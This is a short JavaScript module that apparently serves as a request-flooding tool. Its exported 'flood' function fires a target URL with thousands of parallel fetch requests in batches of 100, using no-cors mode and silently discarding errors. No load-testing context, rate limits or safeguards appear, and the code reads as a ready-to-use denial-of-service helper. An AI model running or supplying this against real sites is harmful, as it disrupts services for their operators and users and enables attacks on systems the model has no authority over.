async function flood(url, count = 3000) {
  const batch = 100;
  for (let i = 0; i < count; i += batch) {
    const promises = [];
    for (let j = 0; j < batch; j++) {
      promises.push(
        fetch(url, { mode: 'no-cors' }).catch(() => {})
      );
    }
    await Promise.all(promises);
  }
}
module.exports = { flood };
